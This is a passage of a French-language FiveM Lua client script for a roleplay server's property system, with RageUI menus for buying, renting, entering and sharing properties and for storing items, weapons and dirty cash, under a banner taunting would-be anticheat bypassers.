-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local OwnedProperties, Blips, CurrentActionData = {}, {}, {}
local CurrentProperty, CurrentPropertyOwner, LastProperty, LastPart, CurrentAction, CurrentActionMsg
local firstSpawn, hasChest, hasAlreadyEnteredMarker = true, false, false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('SwLife:initObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

RegisterNetEvent('::{razzway.xyz}::esx:playerLoaded')
AddEventHandler('::{razzway.xyz}::esx:playerLoaded', function(xPlayer)
	ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getProperties', function(properties)
		Config.Properties = properties
		CreateBlips()
	end)

	ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getOwnedProperties', function(ownedProperties)
		for i = 1, #ownedProperties, 1 do
			SetPropertyOwned(ownedProperties[i], true)
		end
	end)
end)

RegisterNetEvent('::{razzway.xyz}::esx_property:sendProperties')
AddEventHandler('::{razzway.xyz}::esx_property:sendProperties', function(properties)
	Config.Properties = properties
	CreateBlips()

	ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getOwnedProperties', function(ownedProperties)
		for i = 1, #ownedProperties, 1 do
			SetPropertyOwned(ownedProperties[i], true)
		end
	end)
end)

function DrawSub(text, time)
	ClearPrints()
	BeginTextCommandPrint('STRING')
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandPrint(time, 1)
end

function CreateBlips()
	for i = 1, #Config.Properties, 1 do
		local property = Config.Properties[i]

		if property.entering then
			Blips[property.name] = AddBlipForCoord(property.entering.x, property.entering.y, property.entering.z)

			SetBlipSprite(Blips[property.name], 369)
			SetBlipDisplay(Blips[property.name], 4)
			SetBlipScale(Blips[property.name], 0.8)
			SetBlipAsShortRange(Blips[property.name], true)

			BeginTextCommandSetBlipName("STRING")
			AddTextComponentSubstringPlayerName(_U('free_prop'))
			EndTextCommandSetBlipName(Blips[property.name])
		end
	end
end

function GetProperties()
	return Config.Properties
end

function GetProperty(name)
	for i = 1, #Config.Properties, 1 do
		if Config.Properties[i].name == name then
			return Config.Properties[i]
		end
	end
end

function GetGateway(property)
	for i = 1, #Config.Properties, 1 do
		local property2 = Config.Properties[i]

		if property2.isGateway and property2.name == property.gateway then
			return property2
		end
	end
end

function GetGatewayProperties(property)
	local properties = {}

	for i = 1, #Config.Properties, 1 do
		if Config.Properties[i].gateway == property.name then
			table.insert(properties, Config.Properties[i])
		end
	end

	return properties
end

function EnterProperty(name, owner)
	local property = GetProperty(name)
	local playerPed = PlayerPedId()
	CurrentProperty = property
	CurrentPropertyOwner = owner

	for i = 1, #Config.Properties, 1 do
		if Config.Properties[i].name ~= name then
			Config.Properties[i].disabled = true
		end
	end

	_TriggerServerEvent('::{razzway.xyz}::esx_property:saveLastProperty', name)

	Citizen.CreateThread(function()
		DoScreenFadeOut(800)

		while not IsScreenFadedOut() do
			Citizen.Wait(0)
		end

		for i = 1, #property.ipls, 1 do
			RequestIpl(property.ipls[i])

			while not IsIplActive(property.ipls[i]) do
				Citizen.Wait(0)
			end
		end

		SetEntityCoords(playerPed, property.inside.x, property.inside.y, property.inside.z)
		DoScreenFadeIn(800)
		DrawSub(property.label, 5000)
	end)
end

function ExitProperty(name)
	local property = GetProperty(name)
	local playerPed = PlayerPedId()
	local outside = nil
	CurrentProperty = nil

	if property.isSingle then
		outside = property.outside
	else
		outside = GetGateway(property).outside
	end

	_TriggerServerEvent('::{razzway.xyz}::esx_property:deleteLastProperty')

	Citizen.CreateThread(function()
		DoScreenFadeOut(800)

		while not IsScreenFadedOut() do
			Citizen.Wait(0)
		end

		SetEntityCoords(playerPed, outside.x, outside.y, outside.z)

		for i = 1, #property.ipls, 1 do
			RemoveIpl(property.ipls[i])
		end

		for i = 1, #Config.Properties, 1 do
			Config.Properties[i].disabled = false
		end

		DoScreenFadeIn(800)
	end)
end

function SetPropertyOwned(name, owned)
	local property = GetProperty(name)
	local entering = nil
	local enteringName = nil

	if property.isSingle then
		entering = property.entering
		enteringName = property.name
	else
		local gateway = GetGateway(property)
		entering = gateway.entering
		enteringName = gateway.name
	end

	if owned then
		OwnedProperties[name] = true
		RemoveBlip(Blips[enteringName])

		Blips[enteringName] = AddBlipForCoord(entering.x, entering.y, entering.z)

		SetBlipSprite(Blips[enteringName], 357)
		SetBlipAsShortRange(Blips[enteringName], true)
		SetBlipScale(Blips[enteringName], 0.8)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName(_U('property'))
		EndTextCommandSetBlipName(Blips[enteringName])
	else
		OwnedProperties[name] = nil
		local found = false

		for k, v in pairs(OwnedProperties) do
			local _property = GetProperty(k)
			local _gateway = GetGateway(_property)

			if _gateway then
				if _gateway.name == enteringName then
					found = true
					break
				end
			end
		end

		if not found then
			RemoveBlip(Blips[enteringName])

			Blips[enteringName] = AddBlipForCoord(entering.x, entering.y, entering.z)
			SetBlipSprite(Blips[enteringName], 369)
			SetBlipAsShortRange(Blips[enteringName], true)

			BeginTextCommandSetBlipName("STRING")
			AddTextComponentSubstringPlayerName(_U('free_prop'))
			EndTextCommandSetBlipName(Blips[enteringName])
		end
	end
end

function PropertyIsOwned(property)
	return OwnedProperties[property.name] == true
end

local sProperty = {}
RMenu.Add('property', 'main', RageUI.CreateMenu("Habitation", "~b~Effectuez vos actions"))
RMenu:Get('property', 'main').EnableMouse = false
RMenu:Get('property', 'main').Closed = function() sProperty.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenPropertyMenu(property)
	local elements = {}
	if sProperty.Menu then
		sProperty.Menu = false
	else
		sProperty.Menu = true
		RageUI.Visible(RMenu:Get('property', 'main'), true)
		FreezeEntityPosition(GetPlayerPed(-1), true)

		Citizen.CreateThread(function()
			while sProperty.Menu do
				RageUI.IsVisible(RMenu:Get('property', 'main'), true, true, true, function()
					if PropertyIsOwned(property) then
						RageUI.ButtonWithStyle("Entrer dans sa propriété", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								TriggerEvent('::{razzway.xyz}::instance:create', 'property', {property = property.name, owner = ESX.GetPlayerData().identifier})
								FreezeEntityPosition(GetPlayerPed(-1), false)
								RageUI.CloseAll()
							end
						end)

						if not Config.EnablePlayerManagement then
							RageUI.ButtonWithStyle("Vendre sa propriété", nil, {RightLabel = "→"}, true, function(h,a,s)
								if s then
									_TriggerServerEvent('::{razzway.xyz}::esx_property:removeOwnedProperty', property.name)
									FreezeEntityPosition(GetPlayerPed(-1), false)
									RageUI.CloseAll()
								end
							end)
						end
					else
						RageUI.ButtonWithStyle("Acheter la propriété", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								_TriggerServerEvent('::{razzway.xyz}::esx_property:buyProperty', property.name)
								FreezeEntityPosition(GetPlayerPed(-1), false)
								RageUI.CloseAll()
							end
						end)

						RageUI.ButtonWithStyle("Visier la propriété", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								TriggerEvent('::{razzway.xyz}::instance:create', 'property', {property = property.name, owner = ESX.GetPlayerData().identifier})
								FreezeEntityPosition(GetPlayerPed(-1), false)
								RageUI.CloseAll()
							end
						end)
					end
				end)
				Wait(1)
			end
		end)
	end
end

local sPropertyGateway = {}
RMenu.Add('propertygateway', 'gateway', RageUI.CreateMenu("Habitation", "~b~Effectuez vos actions"))
RMenu:Get('propertygateway', 'gateway').EnableMouse = false
RMenu:Get('propertygateway', 'gateway').Closed = function() sPropertyGateway.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenGatewayMenu(property)
	if sPropertyGateway.Menu then
		sPropertyGateway.Menu = false
	else
		if Config.EnablePlayerManagement then
			OpenGatewayOwnedPropertiesMenu(gatewayProperties)
		else
			sPropertyGateway.Menu = true
			RageUI.Visible(RMenu:Get('propertygateway', 'gateway'), true)
			FreezeEntityPosition(GetPlayerPed(-1), true)

			Citizen.CreateThread(function()
				while sPropertyGateway.Menu do
					RageUI.IsVisible(RMenu:Get('propertygateway', 'gateway'), true, true, true, function()
						RageUI.ButtonWithStyle("Vos propriétés", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								RageUI.CloseAll()
								OpenGatewayOwnedPropertiesMenu(property)
								FreezeEntityPosition(GetPlayerPed(-1), false)
							end
						end)

						RageUI.ButtonWithStyle("Propriétés disponibles", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								RageUI.CloseAll()
								OpenGatewayAvailablePropertiesMenu(property)
								FreezeEntityPosition(GetPlayerPed(-1), false)
							end
						end)
					end)
					Wait(1)
				end
			end)
		end
	end
end

local sOwnedPropertiesMenu = {}
RMenu.Add('propertyowned', 'owned', RageUI.CreateMenu("Habitation", "~b~Effectuez vos actions"))
RMenu.Add('propertyowned', 'vendreappart', RageUI.CreateSubMenu(RMenu:Get('propertyowned', 'owned'), "Faites vos actions", "~b~Vendez vos habitations"))
RMenu.Add('propertyowned', 'listeappart', RageUI.CreateSubMenu(RMenu:Get('propertyowned', 'owned'), "Faites vos actions", "~b~Entrer dans votre habitations"))
RMenu:Get('propertyowned', 'owned').EnableMouse = false
RMenu:Get('propertyowned', 'owned').Closed = function() sOwnedPropertiesMenu.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenGatewayOwnedPropertiesMenu(property)
	local gatewayProperties = GetGatewayProperties(property)
	local elements = {}
	if sOwnedPropertiesMenu.Menu then
		sOwnedPropertiesMenu.Menu = false
	else
		sOwnedPropertiesMenu.Menu = true
		RageUI.Visible(RMenu:Get('propertyowned', 'owned'), true)
		FreezeEntityPosition(GetPlayerPed(-1), true)

		Citizen.CreateThread(function()
			while sOwnedPropertiesMenu.Menu do
				RageUI.IsVisible(RMenu:Get('propertyowned', 'owned'), true, true, true, function()
					RageUI.ButtonWithStyle("Vos propriétés", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("propertyowned","listeappart"))
					RageUI.ButtonWithStyle("Vendre vos propriétés", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("propertyowned","vendreappart"))
				end)
				RageUI.IsVisible(RMenu:Get('propertyowned', 'listeappart'), true, true, true, function()	
					for i = 1, #gatewayProperties, 1 do
						if PropertyIsOwned(gatewayProperties[i]) then
							local label = gatewayProperties[i].label
							local value = gatewayProperties[i].name
							RageUI.ButtonWithStyle("Nom: "..label, nil, {RightLabel = "Entrer →→"}, true, function(h,a,s)
								if s then
									TriggerEvent('::{razzway.xyz}::instance:create', 'property', {property = value, owner = ESX.GetPlayerData().identifier})
									RageUI.CloseAll()
									FreezeEntityPosition(GetPlayerPed(-1), false)
								end
							end)
						end
					end
				end)
				RageUI.IsVisible(RMenu:Get('propertyowned', 'vendreappart'), true, true, true, function()
					for i = 1, #gatewayProperties, 1 do
						if PropertyIsOwned(gatewayProperties[i]) then
							local label = gatewayProperties[i].label
							local value = gatewayProperties[i].name
							RageUI.ButtonWithStyle("Nom: "..label, nil, {RightLabel = "Vendre →→"}, true, function(h,a,s)
								if s then
									_TriggerServerEvent('::{razzway.xyz}::esx_property:removeOwnedProperty', value)
									RageUI.CloseAll()
									FreezeEntityPosition(GetPlayerPed(-1), false)
								end
							end)
						end
					end
				end)
				Wait(1)
			end
		end)
	end
end

local sPropertyAvailable = {}
RMenu.Add('propertyavailable', 'available', RageUI.CreateMenu("Habitations", "~b~Effectuez vos actions"))
RMenu.Add('propertyavailable', 'visiterappart', RageUI.CreateSubMenu(RMenu:Get('propertyavailable', 'available'), "Faites vos actions", "~b~Visitez nos logements"))
RMenu.Add('propertyavailable', 'louerappart', RageUI.CreateSubMenu(RMenu:Get('propertyavailable', 'available'), "Faites vos actions", "~b~Louez nos logements"))
RMenu.Add('propertyavailable', 'acheterappart', RageUI.CreateSubMenu(RMenu:Get('propertyavailable', 'available'), "Faites vos actions", "~b~Achetez nos logements"))
RMenu:Get('propertyavailable', 'available').EnableMouse = false
RMenu:Get('propertyavailable', 'available').Closed = function() sProperty.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenGatewayAvailablePropertiesMenu(property)
	local gatewayProperties = GetGatewayProperties(property)
	local elements = {}

	if sPropertyAvailable.Menu then
		sPropertyAvailable.Menu = false
	else
		sPropertyAvailable.Menu = true
		RageUI.Visible(RMenu:Get('propertyavailable', 'available'), true)
		FreezeEntityPosition(GetPlayerPed(-1), true)

		Citizen.CreateThread(function()
			while sPropertyAvailable.Menu do
				RageUI.IsVisible(RMenu:Get('propertyavailable', 'available'), true, true, true, function()
					RageUI.ButtonWithStyle("Achetez nos logements", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("propertyavailable","acheterappart"))
					RageUI.ButtonWithStyle("Louez nos logements", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("propertyavailable","louerappart"))
					RageUI.ButtonWithStyle("Visitez nos logements", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("propertyavailable","visiterappart"))
				end)
				RageUI.IsVisible(RMenu:Get('propertyavailable', 'acheterappart'), true, true, true, function()	
					for i = 1, #gatewayProperties, 1 do
						if not PropertyIsOwned(gatewayProperties[i]) then
							local label = gatewayProperties[i].label
							local rightlabel = {'$' .. ESX.Math.GroupDigits(gatewayProperties[i].price)}
							local value = gatewayProperties[i].name
							local price = gatewayProperties[i].price
							RageUI.ButtonWithStyle("Nom: "..label, nil, {RightLabel = "Achetez →→"}, true, function(h,a,s)
								if s then
									_TriggerServerEvent('::{razzway.xyz}::esx_property:buyProperty', value)
									RageUI.CloseAll()
									FreezeEntityPosition(GetPlayerPed(-1), false)
								end
							end)
						end
					end
				end)
				RageUI.IsVisible(RMenu:Get('propertyavailable', 'louerappart'), true, true, true, function()	
					for i = 1, #gatewayProperties, 1 do
						if not PropertyIsOwned(gatewayProperties[i]) then
							local label = gatewayProperties[i].label
							local rightlabel = {'$' .. ESX.Math.GroupDigits(gatewayProperties[i].price)}
							local value = gatewayProperties[i].name
							local price = gatewayProperties[i].price
							RageUI.ButtonWithStyle("Nom: "..label, nil, {RightLabel = "Louez →→"}, true, function(h,a,s)
								if s then
									_TriggerServerEvent('::{razzway.xyz}::esx_property:rentProperty', value)
									RageUI.CloseAll()
									FreezeEntityPosition(GetPlayerPed(-1), false)
								end
							end)
						end
					end
				end)
				RageUI.IsVisible(RMenu:Get('propertyavailable', 'visiterappart'), true, true, true, function()	
					for i = 1, #gatewayProperties, 1 do
						if not PropertyIsOwned(gatewayProperties[i]) then
							local label = gatewayProperties[i].label
							local rightlabel = {'$' .. ESX.Math.GroupDigits(gatewayProperties[i].price)}
							local value = gatewayProperties[i].name
							local price = gatewayProperties[i].price
							RageUI.ButtonWithStyle("Nom: "..label, nil, {RightLabel = "Louez →→"}, true, function(h,a,s)
								if s then
									TriggerEvent('::{razzway.xyz}::instance:create', 'property', {property = value, owner = ESX.GetPlayerData().identifier})
									RageUI.CloseAll()
									FreezeEntityPosition(GetPlayerPed(-1), false)
								end
							end)
						end
					end
				end)
				Wait(1)
			end
		end)
	end
end

local sRoomMenu = {}
RMenu.Add('roommenu', 'room', RageUI.CreateMenu("Habitation", "~b~Effectuez vos actions"))
RMenu.Add('roommenu', 'invitez', RageUI.CreateSubMenu(RMenu:Get('roommenu', 'room'), "Faites vos actions", "~b~Invitez vos amis"))
--RMenu.Add('roommenu', 'listeappart', RageUI.CreateSubMenu(RMenu:Get('propertyowned', 'room'), "Faites vos actions", "~b~Entrer dans votre habitations"))
RMenu:Get('roommenu', 'room').EnableMouse = false
RMenu:Get('roommenu', 'room').Closed = function() sRoomMenu.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenRoomMenu(property, owner)
	local entering = nil
	--local elements = {{label = _U('invite_player'), value = 'invite_player'}}
	if sRoomMenu.Menu then
		sRoomMenu = false
	else
		sRoomMenu.Menu = true
		RageUI.Visible(RMenu:Get('roommenu', 'room'), true)
		FreezeEntityPosition(GetPlayerPed(-1), true)

		Citizen.CreateThread(function()
			while sRoomMenu.Menu do
				RageUI.IsVisible(RMenu:Get('roommenu', 'room'), true, true, true, function()
					RageUI.ButtonWithStyle("Invitez vos amis", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("roommenu","invitez"))
					RageUI.ButtonWithStyle("Déposez vos items", nil, {RightLabel = "→"}, true, function(h,a,s)
						if s then
							OpenPlayerInventoryMenu(property, owner)
						end
					end)
					RageUI.ButtonWithStyle("Récupérez vos items", nil, {RightLabel = "→"}, true, function(h,a,s)
						if s then
							OpenRoomInventoryMenu(property, owner)
						end
					end)
				end)
				RageUI.IsVisible(RMenu:Get('roommenu', 'invitez'), true, true, true, function()
					if property.isSingle then
						entering = property.entering
					else
						entering = GetGateway(property).entering
					end
					local playersInArea = ESX.Game.GetPlayersInArea(vector3(entering.x, entering.y, entering.z), 10.0)
					local elements = {}
					local label = GetPlayerName(playersInArea[i])
					local value = playersInArea[i]
					for i = 1, #playersInArea, 1 do
						if playersInArea[i] ~= PlayerId() then
							RageUI.ButtonWithStyle("Invitez: "..label, nil, {RightLabel = "→"}, true, function(h,a,s)
								if s then
									TriggerEvent('::{razzway.xyz}::instance:invite', 'property', GetPlayerServerId(value), {property = property.name, owner = owner})
									ESX.ShowNotification(_U('you_invited', GetPlayerName(value)))
								end
							end)
						end
					end
				end)
				Wait(1)
			end
		end)
	end

	--[[if property.isSingle then
		entering = property.entering
	else
		entering = GetGateway(property).entering
	end

	if CurrentPropertyOwner == owner then
		table.insert(elements, {label = _U('player_clothes'), value = 'player_dressing'})
		table.insert(elements, {label = _U('remove_cloth'), value = 'remove_cloth'})
	end

	table.insert(elements, {label = _U('remove_object'), value = 'room_inventory'})
	table.insert(elements, {label = _U('deposit_object'), value = 'player_inventory'})

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'room', {
		title = property.label,
		elements = elements
	}, function(data, menu)
		if data.current.value == 'invite_player' then
			local playersInArea = ESX.Game.GetPlayersInArea(vector3(entering.x, entering.y, entering.z), 10.0)
			local elements = {}

			for i = 1, #playersInArea, 1 do
				if playersInArea[i] ~= PlayerId() then
					table.insert(elements, {label = GetPlayerName(playersInArea[i]), value = playersInArea[i]})
				end
			end

			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'room_invite', {
				title = property.label .. ' - ' .. _U('invite'),
				elements = elements
			}, function(data2, menu2)
				TriggerEvent('::{razzway.xyz}::instance:invite', 'property', GetPlayerServerId(data2.current.value), {property = property.name, owner = owner})
				ESX.ShowNotification(_U('you_invited', GetPlayerName(data2.current.value)))
			end, function(data2, menu2)
			end)
		elseif data.current.value == 'player_dressing' then
			ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerDressing', function(dressing)
				local elements = {}

				for i = 1, #dressing, 1 do
					table.insert(elements, {
						label = dressing[i],
						value = i
					})
				end

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'player_dressing', {
					title = property.label .. ' - ' .. _U('player_clothes'),
					elements = elements
				}, function(data2, menu2)
					TriggerEvent('::{razzway.xyz}::skinchanger:getSkin', function(skin)
						ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerOutfit', function(clothes)
							TriggerEvent('::{razzway.xyz}::skinchanger:loadClothes', skin, clothes)
							TriggerEvent('::{razzway.xyz}::esx_skin:setLastSkin', skin)
							TriggerEvent('::{razzway.xyz}::skinchanger:getSkin', function(skin)
								_TriggerServerEvent('::{razzway.xyz}::esx_skin:save', skin)
							end)
						end, data2.current.value)
					end)
				end, function(data2, menu2)
				end)
			end)
		elseif data.current.value == 'remove_cloth' then
			ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerDressing', function(dressing)
				local elements = {}

				for i = 1, #dressing, 1 do
					table.insert(elements, {
						label = dressing[i],
						value = i
					})
				end

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'remove_cloth', {
					title = property.label .. ' - ' .. _U('remove_cloth'),
					elements = elements
				}, function(data2, menu2)
					menu2.close()
					_TriggerServerEvent('::{razzway.xyz}::esx_property:removeOutfit', data2.current.value)
					ESX.ShowNotification(_U('removed_cloth'))
				end, function(data2, menu2)
				end)
			end)
		elseif data.current.value == 'room_inventory' then
			OpenRoomInventoryMenu(property, owner)
		elseif data.current.value == 'player_inventory' then
			OpenPlayerInventoryMenu(property, owner)
		end
	end, function(data, menu)
		CurrentAction = 'room_menu'
		CurrentActionMsg = _U('press_to_menu')
		CurrentActionData = {property = property, owner = owner}
	end)]]
end

local sInventoryMenu = {}
RMenu.Add('sinventory', 'base', RageUI.CreateMenu("Habitation", "~b~Effectuez vos actions"))
RMenu.Add('sinventory', 'thunas', RageUI.CreateSubMenu(RMenu:Get('sinventory', 'base'), "Faites vos actions", "~b~Récupérez vos objets"))
RMenu.Add('sinventory', 'argenntttt', RageUI.CreateSubMenu(RMenu:Get('sinventory', 'thunas'), "Faites vos actions", "~b~Récupérez vos objets"))
RMenu.Add('sinventory', 'gunnsss', RageUI.CreateSubMenu(RMenu:Get('sinventory', 'thunas'), "Faites vos actions", "~b~Récupérez vos objets"))
RMenu.Add('sinventory', 'itemsss', RageUI.CreateSubMenu(RMenu:Get('sinventory', 'thunas'), "Faites vos actions", "~b~Récupérez vos objets"))
RMenu:Get('sinventory', 'base').EnableMouse = false
RMenu:Get('sinventory', 'base').Closed = function() sInventoryMenu.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenRoomInventoryMenu(property, owner)
	if sInventoryMenu.Menu then
		sInventoryMenu.Menu = false
	else
		sInventoryMenu.Menu = true
		RageUI.Visible(RMenu:Get('sinventory', 'base'), true)
		FreezeEntityPosition(GetPlayerPed(-1), true)
		Citizen.CreateThread(function()
			while sInventoryMenu.Menu do
				RageUI.IsVisible(RMenu:Get('sinventory', 'base'), true, true, true, function()
					RageUI.ButtonWithStyle("Récupérez vos objets", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventory","thunas"))
				end)
				
				RageUI.IsVisible(RMenu:Get('sinventory', 'thunas'), true, true, true, function()
					RageUI.ButtonWithStyle("Armes", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventory","gunnsss"))
					RageUI.ButtonWithStyle("Argent", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventory","argenntttt"))
					RageUI.ButtonWithStyle("Items", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventory","itemsss"))
				end)
				
				RageUI.IsVisible(RMenu:Get('sinventory', 'argenntttt'), true, true, true, function()
					ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPropertyInventory', function(inventory)
						if inventory.dirtycash > 0 then
							local label = _U('dirtycash')
							local rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)}
							local type = 'item_account'
							local value = 'dirtycash'
							RageUI.ButtonWithStyle("Récupérez votre argent sale", nil, {RightLabel = ESX.Math.GroupDigits(inventory.dirtycash)}, true, function(h,a,s)
								if s then
									local quantity = KeyboardInputQuantity("Entrez le montant", "", 15)
									if quantity ~= nil then
										_TriggerServerEvent('::{razzway.xyz}::esx_property:getItem', owner, type, value, quantity)
										RageUI.CloseAll()
									else
										ESX.ShowNotification(_U('amount_invalid'))
									end
								end
							end)
						end
					end)
				end)

				RageUI.IsVisible(RMenu:Get('sinventory', 'itemsss'), true, true, true, function()
					ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPropertyInventory', function(inventory)

						for i = 1, #inventory.items, 1 do
							local item = inventory.items[i]
							if item.count > 0 then
								local label = item.label
								local rightlabel = {'(' .. item.count .. ')'}
								local type = 'item_standard'
								local value = item.name
								RageUI.ButtonWithStyle("Item: "..label, nil, {RightLabel = item.count}, true, function(h,a,s)
									if s then
										local quantity = KeyboardInputQuantity("Entrez le montant", "", 15)
										if quantity ~= nil then
											_TriggerServerEvent('::{razzway.xyz}::esx_property:getItem', owner, type, value, quantity)
											RageUI.CloseAll()
										end
									end
								end)
							end
						end
					end)
				end)

				RageUI.IsVisible(RMenu:Get('sinventory', 'gunnsss'), true, true, true, function()
					ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPropertyInventory', function(inventory)
						for i = 1, #inventory.weapons, 1 do
							local weapon = inventory.weapons[i]
							local label = ESX.GetWeaponLabel(weapon.name)
							local rightlabel = {'[' .. weapon.ammo .. ']'}
							local type = 'item_weapon'
							local value = weapon.name
							local ammo = weapon.ammo
							RageUI.ButtonWithStyle("Arme: "..label, nil, {RightLabel = ammo}, true, function(h,a,s)
								if s then
									_TriggerServerEvent('::{razzway.xyz}::esx_property:getItem', owner, type, value, ammo)
									RageUI.CloseAll()
								end
							end)
						end
					end)
				end)
				Wait(1)
			end
		end)
	end

	--[[ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPropertyInventory', function(inventory)
		local elements = {}

		if inventory.dirtycash > 0 then
			table.insert(elements, {
				label = _U('dirtycash'),
				rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)},
				type = 'item_account',
				value = 'dirtycash'
			})
		end

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		for i = 1, #inventory.weapons, 1 do
			local weapon = inventory.weapons[i]

			table.insert(elements, {
				label = ESX.GetWeaponLabel(weapon.name),
				rightlabel = {'[' .. weapon.ammo .. ']'},
				type = 'item_weapon',
				value = weapon.name,
				ammo = weapon.ammo
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'room_inventory', {
			title = property.label .. ' - ' .. _U('inventory'),
			elements = elements
		}, function(data, menu)
			if data.current.type == 'item_weapon' then
				menu.close()

				_TriggerServerEvent('::{razzway.xyz}::esx_property:getItem', owner, data.current.type, data.current.value, data.current.ammo)
				ESX.SetTimeout(300, function()
					OpenRoomInventoryMenu(property, owner)
				end)
			else
				ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'get_item_count', {
					title = _U('amount')
				}, function(data2, menu2)
					local quantity = tonumber(data2.value)

					if quantity == nil then
						ESX.ShowNotification(_U('amount_invalid'))
					else
						menu.close()
						menu2.close()

						_TriggerServerEvent('::{razzway.xyz}::esx_property:getItem', owner, data.current.type, data.current.value, quantity)
						ESX.SetTimeout(300, function()
							OpenRoomInventoryMenu(property, owner)
						end)
					end
				end, function(data2, menu2)
					menu2.close()
				end)
			end
		end, function(data, menu)
		end)
	end, owner)]]
end

local sInventoryMenuD = {}
RMenu.Add('sinventoryDeposer', 'deposer', RageUI.CreateMenu("Habitation", "~b~Effectuez vos actions"))
RMenu.Add('sinventoryDeposer', 'dthunas', RageUI.CreateSubMenu(RMenu:Get('sinventoryDeposer', 'deposer'), "Faites vos actions", "~b~Déposez vos objets"))
RMenu.Add('sinventoryDeposer', 'dargenntttt', RageUI.CreateSubMenu(RMenu:Get('sinventoryDeposer', 'deposer'), "Faites vos actions", "~b~Déposez vos objets"))
RMenu.Add('sinventoryDeposer', 'dgunnsss', RageUI.CreateSubMenu(RMenu:Get('sinventoryDeposer', 'deposer'), "Faites vos actions", "~b~Déposez vos objets"))
RMenu.Add('sinventoryDeposer', 'ditemsss', RageUI.CreateSubMenu(RMenu:Get('sinventoryDeposer', 'deposer'), "Faites vos actions", "~b~Déposez vos objets"))
RMenu:Get('sinventoryDeposer', 'deposer').EnableMouse = false
RMenu:Get('sinventoryDeposer', 'deposer').Closed = function() sInventoryMenuD.Menu = false FreezeEntityPosition(GetPlayerPed(-1), false) end
function OpenPlayerInventoryMenu(property, owner)
	if sInventoryMenuD.Menu then
		sInventoryMenuD.Menu = false
	else
		sInventoryMenuD.Menu = true
		RageUI.Visible(RMenu:Get('sinventoryDeposer', 'deposer'), true)
		FreezeEntityPosition(GetPlayerPed(-1), true)

		Citizen.CreateThread(function()
			while sInventoryMenuD.Menu do
				RageUI.IsVisible(RMenu:Get('sinventoryDeposer', 'deposer'), true, true, true, function()
					RageUI.ButtonWithStyle("Déposez vos objets", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventoryDeposer","dthunas"))
				end)

				RageUI.IsVisible(RMenu:Get('sinventoryDeposer', 'deposer'), true, true, true, function()
					RageUI.ButtonWithStyle("Armes", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventoryDeposer","dgunnsss"))
					RageUI.ButtonWithStyle("Argent", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventoryDeposer","dargenntttt"))
					RageUI.ButtonWithStyle("Items", nil, {RightLabel = "→"}, true, function(h,a,s)
					end,RMenu:Get("sinventoryDeposer","ditemsss"))
				end)

				RageUI.IsVisible(RMenu:Get('sinventoryDeposer', 'dargenntttt'), true, true, true, function()
					ESX.TriggerServerCallback('::{razzway.xyz}::esx_property:getPlayerInventory', function(inventory)
						RageUI.ButtonWithStyle("Déposez votre argent", nil, {RightLabel = "→"}, true, function(h,a,s)
							if s then
								if inventory.dirtycash > 0 then
									local label = _U('dirtycash')
									local rightlabel = {'$' .. ESX.Math.GroupDigits(inventory.dirtycash)}
									local type = 'item_account'
									local value = 'dirtycash'
									local quantity = KeyboardInputQuantity("Entrez le montant", "", 15)
									if quantity ~= nil then
										_TriggerServerEvent('::{razzway.xyz}::esx_property:putItem', owner, type, value, quantity)
										RageUI.CloseAll()
									else
										ESX.ShowNotification(_U('amount_invalid'))
									end
